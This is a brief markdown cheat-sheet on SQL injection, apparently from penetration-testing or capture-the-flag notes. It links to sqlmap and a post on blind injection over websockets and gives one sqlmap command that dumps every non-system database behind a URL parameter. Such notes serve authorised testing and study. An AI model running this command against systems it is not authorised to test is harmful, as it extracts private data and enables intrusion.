# SQL Injection

## Links

- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [SocketSQL](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html)

## Dump all databases

```sh
sqlmap --dump-all --exclude-sysdbs -u http://URL/?name=1
```
